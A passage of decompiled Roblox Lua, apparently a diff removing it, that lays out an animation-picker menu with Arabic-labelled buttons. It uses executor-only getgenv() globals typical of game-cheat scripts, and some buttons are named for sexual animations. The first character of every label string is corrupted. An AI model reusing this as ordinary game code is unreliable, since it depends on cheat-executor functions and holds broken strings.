-    vu277.Size = UDim2.new(0, 395, 0, 320)
-    vu277.Visible = false
-    vu277.CanvasSize = UDim2.new(0, 0, 1.6, 0)
-    vu277.ScrollBarThickness = 5
-    vu278.Name = "Animations_Section"
-    vu278.Parent = vu221
-    vu278.Active = true
-    vu278.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu278.BackgroundTransparency = 1
-    vu278.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu278.BorderSizePixel = 0
-    vu278.Position = UDim2.new(0, 105, 0, 30)
-    vu278.Size = UDim2.new(0, 395, 0, 320)
-    vu278.Visible = false
-    vu278.CanvasSize = UDim2.new(0, 0, 0, 0)
-    vu278.ScrollBarThickness = 5
-    v242.Name = "Alert_Label"
-    v242.Parent = vu278
-    v242.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    v242.BackgroundTransparency = 1
-    v242.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v242.BorderSizePixel = 0
-    v242.Position = UDim2.new(0, 43, 0, 12)
-    v242.Size = UDim2.new(0, 300, 0, 100)
-    v242.Font = Enum.Font.SourceSans
-    v242.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v242.TextSize = 42
-    v242.Text = "\239\191\189\216\177\216\172\217\137 \216\167\216\174\216\170\217\138\216\167\216\177 \217\134\217\136\216\185 \216\167\217\132\216\167\217\134\217\133\217\138\216\180\217\134 \n>_<"
-    v242.TextWrapped = true
-    v242.TextXAlignment = Enum.TextXAlignment.Center
-    v242.TextYAlignment = Enum.TextYAlignment.Top
-    v279.Name = "VampireAnim_Button"
-    v279.Parent = vu276
-    v279.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v279.BackgroundTransparency = 0.5
-    v279.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v279.BorderSizePixel = 0
-    v279.Position = UDim2.new(0, 25, 0, 25)
-    v279.Size = UDim2.new(0, 150, 0, 30)
-    v279.Font = Enum.Font.Oswald
-    v279.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\129\217\133\216\168\216\167\217\138\216\177"
-    v279.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v279.TextScaled = true
-    v279.TextSize = 14
-    v279.TextWrapped = true
-    v280.Name = "DefaultAnim_Button"
-    v280.Parent = vu276
-    v280.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v280.BackgroundTransparency = 0.5
-    v280.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v280.BorderSizePixel = 0
-    v280.Position = UDim2.new(0, 210, 0, 25)
-    v280.Size = UDim2.new(0, 150, 0, 30)
-    v280.Font = Enum.Font.Oswald
-    v280.Text = "\239\191\189\216\180\217\138\216\169 \216\183\216\168\217\138\216\185\217\138\216\169"
-    v280.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v280.TextScaled = true
-    v280.TextSize = 14
-    v280.TextWrapped = true
-    v281.Name = "HeroAnim_Button"
-    v281.Parent = vu276
-    v281.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v281.BackgroundTransparency = 0.5
-    v281.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v281.BorderSizePixel = 0
-    v281.Position = UDim2.new(0, 25, 0, 575)
-    v281.Size = UDim2.new(0, 150, 0, 30)
-    v281.Font = Enum.Font.Oswald
-    v281.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\168\216\183\217\132"
-    v281.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v281.TextScaled = true
-    v281.TextSize = 14
-    v281.TextWrapped = true
-    v282.Name = "ZombieClassicAnim_Button"
-    v282.Parent = vu276
-    v282.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v282.BackgroundTransparency = 0.5
-    v282.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v282.BorderSizePixel = 0
-    v282.Position = UDim2.new(0, 25, 0, 75)
-    v282.Size = UDim2.new(0, 150, 0, 30)
-    v282.Font = Enum.Font.Oswald
-    v282.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\178\217\136\217\133\216\168\217\138 \217\131\217\132\216\167\216\179\217\138\217\131"
-    v282.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v282.TextScaled = true
-    v282.TextSize = 14
-    v282.TextWrapped = true
-    v283.Name = "MageAnim_Button"
-    v283.Parent = vu276
-    v283.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v283.BackgroundTransparency = 0.5
-    v283.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v283.BorderSizePixel = 0
-    v283.Position = UDim2.new(0, 210, 0, 75)
-    v283.Size = UDim2.new(0, 150, 0, 30)
-    v283.Font = Enum.Font.Oswald
-    v283.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\179\216\167\216\173\216\177 "
-    v283.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v283.TextScaled = true
-    v283.TextSize = 14
-    v283.TextWrapped = true
-    v284.Name = "GhostAnim_Button"
-    v284.Parent = vu276
-    v284.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v284.BackgroundTransparency = 0.5
-    v284.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v284.BorderSizePixel = 0
-    v284.Position = UDim2.new(0, 25, 0, 125)
-    v284.Size = UDim2.new(0, 150, 0, 30)
-    v284.Font = Enum.Font.Oswald
-    v284.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\180\216\168\216\173"
-    v284.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v284.TextScaled = true
-    v284.TextSize = 14
-    v284.TextWrapped = true
-    v285.Name = "ElderAnim_Button"
-    v285.Parent = vu276
-    v285.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v285.BackgroundTransparency = 0.5
-    v285.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v285.BorderSizePixel = 0
-    v285.Position = UDim2.new(0, 210, 0, 125)
-    v285.Size = UDim2.new(0, 150, 0, 30)
-    v285.Font = Enum.Font.Oswald
-    v285.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\133\216\179\217\134\217\138\217\134 "
-    v285.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v285.TextScaled = true
-    v285.TextSize = 14
-    v285.TextWrapped = true
-    v286.Name = "LevitationAnim_Button"
-    v286.Parent = vu276
-    v286.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v286.BackgroundTransparency = 0.5
-    v286.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v286.BorderSizePixel = 0
-    v286.Position = UDim2.new(0, 25, 0, 175)
-    v286.Size = UDim2.new(0, 150, 0, 30)
-    v286.Font = Enum.Font.Oswald
-    v286.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\170\217\131\216\168\216\177 "
-    v286.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v286.TextScaled = true
-    v286.TextSize = 14
-    v286.TextWrapped = true
-    v287.Name = "AstronautAnim_Button"
-    v287.Parent = vu276
-    v287.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v287.BackgroundTransparency = 0.5
-    v287.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v287.BorderSizePixel = 0
-    v287.Position = UDim2.new(0, 210, 0, 175)
-    v287.Size = UDim2.new(0, 150, 0, 30)
-    v287.Font = Enum.Font.Oswald
-    v287.Text = "\239\191\189\216\180\217\138\216\169 \216\177\216\167\216\166\216\175 \216\167\217\132\217\129\216\182\216\167\216\161"
-    v287.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v287.TextScaled = true
-    v287.TextSize = 14
-    v287.TextWrapped = true
-    v288.Name = "NinjaAnim_Button"
-    v288.Parent = vu276
-    v288.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v288.BackgroundTransparency = 0.5
-    v288.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v288.BorderSizePixel = 0
-    v288.Position = UDim2.new(0, 25, 0, 225)
-    v288.Size = UDim2.new(0, 150, 0, 30)
-    v288.Font = Enum.Font.Oswald
-    v288.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\134\217\138\217\134\216\172\216\167"
-    v288.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v288.TextScaled = true
-    v288.TextSize = 14
-    v288.TextWrapped = true
-    v289.Name = "WerewolfAnim_Button"
-    v289.Parent = vu276
-    v289.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v289.BackgroundTransparency = 0.5
-    v289.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v289.BorderSizePixel = 0
-    v289.Position = UDim2.new(0, 210, 0, 225)
-    v289.Size = UDim2.new(0, 150, 0, 30)
-    v289.Font = Enum.Font.Oswald
-    v289.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\176\216\166\216\168 "
-    v289.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v289.TextScaled = true
-    v289.TextSize = 14
-    v289.TextWrapped = true
-    v290.Name = "CartoonAnim_Button"
-    v290.Parent = vu276
-    v290.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v290.BackgroundTransparency = 0.5
-    v290.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v290.BorderSizePixel = 0
-    v290.Position = UDim2.new(0, 25, 0, 275)
-    v290.Size = UDim2.new(0, 150, 0, 30)
-    v290.Font = Enum.Font.Oswald
-    v290.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\131\216\167\216\177\216\170\217\136\217\134 "
-    v290.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v290.TextScaled = true
-    v290.TextSize = 14
-    v290.TextWrapped = true
-    v291.Name = "PirateAnim_Button"
-    v291.Parent = vu276
-    v291.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v291.BackgroundTransparency = 0.5
-    v291.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v291.BorderSizePixel = 0
-    v291.Position = UDim2.new(0, 210, 0, 275)
-    v291.Size = UDim2.new(0, 150, 0, 30)
-    v291.Font = Enum.Font.Oswald
-    v291.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\130\216\177\216\181\216\167\217\134"
-    v291.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v291.TextScaled = true
-    v291.TextSize = 14
-    v291.TextWrapped = true
-    v292.Name = "SneakyAnim_Button"
-    v292.Parent = vu276
-    v292.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v292.BackgroundTransparency = 0.5
-    v292.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v292.BorderSizePixel = 0
-    v292.Position = UDim2.new(0, 25, 0, 325)
-    v292.Size = UDim2.new(0, 150, 0, 30)
-    v292.Font = Enum.Font.Oswald
-    v292.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\133\216\170\216\179\216\170\216\177 "
-    v292.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v292.TextScaled = true
-    v292.TextSize = 14
-    v292.TextWrapped = true
-    v293.Name = "ToyAnim_Button"
-    v293.Parent = vu276
-    v293.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v293.BackgroundTransparency = 0.5
-    v293.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v293.BorderSizePixel = 0
-    v293.Position = UDim2.new(0, 210, 0, 325)
-    v293.Size = UDim2.new(0, 150, 0, 30)
-    v293.Font = Enum.Font.Oswald
-    v293.Text = "\239\191\189\216\180\217\138\216\169 \217\132\216\185\216\168\216\169 "
-    v293.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v293.TextScaled = true
-    v293.TextSize = 14
-    v293.TextWrapped = true
-    v294.Name = "KnightAnim_Button"
-    v294.Parent = vu276
-    v294.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v294.BackgroundTransparency = 0.5
-    v294.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v294.BorderSizePixel = 0
-    v294.Position = UDim2.new(0, 25, 0, 375)
-    v294.Size = UDim2.new(0, 150, 0, 30)
-    v294.Font = Enum.Font.Oswald
-    v294.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\129\216\167\216\177\216\179 "
-    v294.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v294.TextScaled = true
-    v294.TextSize = 14
-    v294.TextWrapped = true
-    v301.Name = "ConfidentAnim_Button"
-    v301.Parent = vu276
-    v301.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v301.BackgroundTransparency = 0.5
-    v301.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v301.BorderSizePixel = 0
-    v301.Position = UDim2.new(0, 210, 0, 375)
-    v301.Size = UDim2.new(0, 150, 0, 30)
-    v301.Font = Enum.Font.Oswald
-    v301.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\136\216\167\216\171\217\130 "
-    v301.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v301.TextScaled = true
-    v301.TextSize = 14
-    v301.TextWrapped = true
-    v302.Name = "PopstarAnim_Button"
-    v302.Parent = vu276
-    v302.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v302.BackgroundTransparency = 0.5
-    v302.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v302.BorderSizePixel = 0
-    v302.Position = UDim2.new(0, 25, 0, 425)
-    v302.Size = UDim2.new(0, 150, 0, 30)
-    v302.Font = Enum.Font.Oswald
-    v302.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\134\216\172\217\133"
-    v302.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v302.TextScaled = true
-    v302.TextSize = 14
-    v302.TextWrapped = true
-    v303.Name = "PrincessAnim_Button"
-    v303.Parent = vu276
-    v303.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v303.BackgroundTransparency = 0.5
-    v303.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v303.BorderSizePixel = 0
-    v303.Position = UDim2.new(0, 210, 0, 425)
-    v303.Size = UDim2.new(0, 150, 0, 30)
-    v303.Font = Enum.Font.Oswald
-    v303.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\167\217\133\217\138\216\177"
-    v303.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v303.TextScaled = true
-    v303.TextSize = 14
-    v303.TextWrapped = true
-    v304.Name = "CowboyAnim_Button"
-    v304.Parent = vu276
-    v304.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v304.BackgroundTransparency = 0.5
-    v304.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v304.BorderSizePixel = 0
-    v304.Position = UDim2.new(0, 25, 0, 475)
-    v304.Size = UDim2.new(0, 150, 0, 30)
-    v304.Font = Enum.Font.Oswald
-    v304.Text = "\239\191\189\216\180\217\138\216\169 \216\177\216\167\216\185\217\138 \216\167\217\132\216\168\217\130\216\177"
-    v304.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v304.TextScaled = true
-    v304.TextSize = 14
-    v304.TextWrapped = true
-    v305.Name = "PatrolAnim_Button"
-    v305.Parent = vu276
-    v305.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v305.BackgroundTransparency = 0.5
-    v305.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v305.BorderSizePixel = 0
-    v305.Position = UDim2.new(0, 210, 0, 475)
-    v305.Size = UDim2.new(0, 150, 0, 30)
-    v305.Font = Enum.Font.Oswald
-    v305.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\180\216\177\216\183\217\138 "
-    v305.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v305.TextScaled = true
-    v305.TextSize = 14
-    v305.TextWrapped = true
-    v306.Name = "ZombieFEAnim_Button"
-    v306.Parent = vu276
-    v306.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v306.BackgroundTransparency = 0.5
-    v306.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v306.BorderSizePixel = 0
-    v306.Position = UDim2.new(0, 25, 0, 525)
-    v306.Size = UDim2.new(0, 150, 0, 30)
-    v306.Font = Enum.Font.Oswald
-    v306.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\178\217\136\217\133\216\168\217\138"
-    v306.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v306.TextScaled = true
-    v306.TextSize = 14
-    v306.TextWrapped = true
-    v296.Name = "StylishAnim_Button"
-    v296.Parent = vu276
-    v296.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v296.BackgroundTransparency = 0.5
-    v296.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v296.BorderSizePixel = 0
-    v296.Position = UDim2.new(0, 210, 0, 575)
-    v296.Size = UDim2.new(0, 150, 0, 30)
-    v296.Font = Enum.Font.Oswald
-    v296.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\133\217\136\216\175\217\132 "
-    v296.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v296.TextScaled = true
-    v296.TextSize = 14
-    v296.TextWrapped = true
-    v298.Name = "RobotAnim_Button"
-    v298.Parent = vu276
-    v298.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v298.BackgroundTransparency = 0.5
-    v298.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v298.BorderSizePixel = 0
-    v298.Position = UDim2.new(0, 210, 0, 625)
-    v298.Size = UDim2.new(0, 150, 0, 30)
-    v298.Font = Enum.Font.Oswald
-    v298.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\216\177\217\136\216\168\217\136\216\170 "
-    v298.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v298.TextScaled = true
-    v298.TextSize = 14
-    v298.TextWrapped = true
-    v297.Name = "BubblyAnim_Button"
-    v297.Parent = vu276
-    v297.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v297.BackgroundTransparency = 0.5
-    v297.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v297.BorderSizePixel = 0
-    v297.Position = UDim2.new(0, 25, 0, 625)
-    v297.Size = UDim2.new(0, 150, 0, 30)
-    v297.Font = Enum.Font.Oswald
-    v297.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\129\216\177\216\173\216\167\217\134 "
-    v297.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v297.TextScaled = true
-    v297.TextSize = 14
-    v297.TextWrapped = true
-    v295.Name = "StylizedAnim_Button"
-    v295.Parent = vu276
-    v295.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v295.BackgroundTransparency = 0.5
-    v295.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v295.BorderSizePixel = 0
-    v295.Position = UDim2.new(0, 210, 0, 525)
-    v295.Size = UDim2.new(0, 150, 0, 30)
-    v295.Font = Enum.Font.Oswald
-    v295.Text = "\239\191\189\216\180\217\138\216\169 \216\167\217\132\217\133\217\136\216\182\216\169 "
-    v295.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v295.TextScaled = true
-    v295.TextSize = 14
-    v295.TextWrapped = true
-    getgenv().ArmcutAnimationR6.Name = "ArmcutAnimationR6"
-    getgenv().ArmcutAnimationR6.Parent = vu277
-    getgenv().ArmcutAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().ArmcutAnimationR6.BackgroundTransparency = 0.5
-    getgenv().ArmcutAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().ArmcutAnimationR6.BorderSizePixel = 0
-    getgenv().ArmcutAnimationR6.Position = UDim2.new(0, 210, 0, 25)
-    getgenv().ArmcutAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().ArmcutAnimationR6.Font = Enum.Font.Oswald
-    getgenv().ArmcutAnimationR6.Text = "\239\191\189\216\183\216\185 \217\138\216\175 (R6)"
-    getgenv().ArmcutAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().ArmcutAnimationR6.TextScaled = true
-    getgenv().ArmcutAnimationR6.TextSize = 14
-    getgenv().ArmcutAnimationR6.TextWrapped = true
-    getgenv().BoxesAnimationR6.Name = "BoxesAnimationR6"
-    getgenv().BoxesAnimationR6.Parent = vu277
-    getgenv().BoxesAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().BoxesAnimationR6.BackgroundTransparency = 0.5
-    getgenv().BoxesAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BoxesAnimationR6.BorderSizePixel = 0
-    getgenv().BoxesAnimationR6.Position = UDim2.new(0, 210, 0, 375)
-    getgenv().BoxesAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().BoxesAnimationR6.Font = Enum.Font.Oswald
-    getgenv().BoxesAnimationR6.Text = "\239\191\189\217\136\217\131\216\179\216\167\216\170 (R6)"
-    getgenv().BoxesAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BoxesAnimationR6.TextScaled = true
-    getgenv().BoxesAnimationR6.TextSize = 14
-    getgenv().BoxesAnimationR6.TextWrapped = true
-    getgenv().FaintAnimationR6.Name = "FaintAnimationR6"
-    getgenv().FaintAnimationR6.Parent = vu277
-    getgenv().FaintAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().FaintAnimationR6.BackgroundTransparency = 0.5
-    getgenv().FaintAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FaintAnimationR6.BorderSizePixel = 0
-    getgenv().FaintAnimationR6.Position = UDim2.new(0, 210, 0, 75)
-    getgenv().FaintAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().FaintAnimationR6.Font = Enum.Font.Oswald
-    getgenv().FaintAnimationR6.Text = "\239\191\189\217\136\217\133 (R6)"
-    getgenv().FaintAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FaintAnimationR6.TextScaled = true
-    getgenv().FaintAnimationR6.TextSize = 14
-    getgenv().FaintAnimationR6.TextWrapped = true
-    getgenv().HugAnimationR6.Name = "HugAnimationR6"
-    getgenv().HugAnimationR6.Parent = vu277
-    getgenv().HugAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().HugAnimationR6.BackgroundTransparency = 0.5
-    getgenv().HugAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().HugAnimationR6.BorderSizePixel = 0
-    getgenv().HugAnimationR6.Position = UDim2.new(0, 210, 0, 125)
-    getgenv().HugAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().HugAnimationR6.Font = Enum.Font.Oswald
-    getgenv().HugAnimationR6.Text = "\239\191\189\216\182\217\134 (R6)"
-    getgenv().HugAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().HugAnimationR6.TextScaled = true
-    getgenv().HugAnimationR6.TextSize = 14
-    getgenv().HugAnimationR6.TextWrapped = true
-    getgenv().BangAnimationR6.Name = "BangAnimationR6"
-    getgenv().BangAnimationR6.Parent = vu277
-    getgenv().BangAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().BangAnimationR6.BackgroundTransparency = 0.5
-    getgenv().BangAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BangAnimationR6.BorderSizePixel = 0
-    getgenv().BangAnimationR6.Position = UDim2.new(0, 210, 0, 175)
-    getgenv().BangAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().BangAnimationR6.Font = Enum.Font.Oswald
-    getgenv().BangAnimationR6.Text = "\239\191\189\216\167\217\134\217\130 (R6)"
-    getgenv().BangAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BangAnimationR6.TextScaled = true
-    getgenv().BangAnimationR6.TextSize = 14
-    getgenv().BangAnimationR6.TextWrapped = true
-    getgenv().IllusionAnimationR6.Name = "IllusionAnimationR6"
-    getgenv().IllusionAnimationR6.Parent = vu277
-    getgenv().IllusionAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().IllusionAnimationR6.BackgroundTransparency = 0.5
-    getgenv().IllusionAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().IllusionAnimationR6.BorderSizePixel = 0
-    getgenv().IllusionAnimationR6.Position = UDim2.new(0, 210, 0, 225)
-    getgenv().IllusionAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().IllusionAnimationR6.Font = Enum.Font.Oswald
-    getgenv().IllusionAnimationR6.Text = "\239\191\189\217\133\217\138\216\182 (R6)"
-    getgenv().IllusionAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().IllusionAnimationR6.TextScaled = true
-    getgenv().IllusionAnimationR6.TextSize = 14
-    getgenv().IllusionAnimationR6.TextWrapped = true
-    getgenv().InsaneAnimationR6.Name = "InsaneAnimationR6"
-    getgenv().InsaneAnimationR6.Parent = vu277
-    getgenv().InsaneAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().InsaneAnimationR6.BackgroundTransparency = 0.5
-    getgenv().InsaneAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().InsaneAnimationR6.BorderSizePixel = 0
-    getgenv().InsaneAnimationR6.Position = UDim2.new(0, 210, 0, 325)
-    getgenv().InsaneAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().InsaneAnimationR6.Font = Enum.Font.Oswald
-    getgenv().InsaneAnimationR6.Text = "\239\191\189\216\172\217\134\217\136\217\134 (R6)"
-    getgenv().InsaneAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().InsaneAnimationR6.TextScaled = true
-    getgenv().InsaneAnimationR6.TextSize = 14
-    getgenv().InsaneAnimationR6.TextWrapped = true
-    getgenv().BackpackHeadAnimationR6.Name = "BackpackHeadAnimationR6"
-    getgenv().BackpackHeadAnimationR6.Parent = vu277
-    getgenv().BackpackHeadAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().BackpackHeadAnimationR6.BackgroundTransparency = 0.5
-    getgenv().BackpackHeadAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BackpackHeadAnimationR6.BorderSizePixel = 0
-    getgenv().BackpackHeadAnimationR6.Position = UDim2.new(0, 210, 0, 275)
-    getgenv().BackpackHeadAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().BackpackHeadAnimationR6.Font = Enum.Font.Oswald
-    getgenv().BackpackHeadAnimationR6.Text = "\239\191\189\216\167\216\179 \216\180\217\134\216\183\216\169 (R6)"
-    getgenv().BackpackHeadAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().BackpackHeadAnimationR6.TextScaled = true
-    getgenv().BackpackHeadAnimationR6.TextSize = 14
-    getgenv().BackpackHeadAnimationR6.TextWrapped = true
-    getgenv().FloatingHeadAnimationR6.Name = "FloatingHeadAnimationR6"
-    getgenv().FloatingHeadAnimationR6.Parent = vu277
-    getgenv().FloatingHeadAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().FloatingHeadAnimationR6.BackgroundTransparency = 0.5
-    getgenv().FloatingHeadAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FloatingHeadAnimationR6.BorderSizePixel = 0
-    getgenv().FloatingHeadAnimationR6.Position = UDim2.new(0, 210, 0, 425)
-    getgenv().FloatingHeadAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().FloatingHeadAnimationR6.Font = Enum.Font.Oswald
-    getgenv().FloatingHeadAnimationR6.Text = "\239\191\189\216\167\216\179 \216\183\216\167\217\138\216\177 (R6)"
-    getgenv().FloatingHeadAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FloatingHeadAnimationR6.TextScaled = true
-    getgenv().FloatingHeadAnimationR6.TextSize = 14
-    getgenv().FloatingHeadAnimationR6.TextWrapped = true
-    getgenv().JerkingAnimationR6.Name = "JerkingAnimationR6"
-    getgenv().JerkingAnimationR6.Parent = vu277
-    getgenv().JerkingAnimationR6.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().JerkingAnimationR6.BackgroundTransparency = 0.5
-    getgenv().JerkingAnimationR6.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().JerkingAnimationR6.BorderSizePixel = 0
-    getgenv().JerkingAnimationR6.Position = UDim2.new(0, 210, 0, 475)
-    getgenv().JerkingAnimationR6.Size = UDim2.new(0, 150, 0, 30)
-    getgenv().JerkingAnimationR6.Font = Enum.Font.Oswald
-    getgenv().JerkingAnimationR6.Text = "\239\191\189\216\172\217\132\217\138\216\174 (R6)"
-    getgenv().JerkingAnimationR6.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().JerkingAnimationR6.TextScaled = true
-    getgenv().JerkingAnimationR6.TextSize = 14
-    getgenv().JerkingAnimationR6.TextWrapped = true
-    getgenv().SaluteAnimationR15.Name = "SaluteAnimationR15"
-    getgenv().SaluteAnimationR15.Parent = vu277
-    getgenv().SaluteAnimationR15.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().SaluteAnimationR15.BackgroundTransparency = 0.5
-    getgenv().SaluteAnimationR15.BorderColor3 = Color3.fromRGB(0, 0, 0)
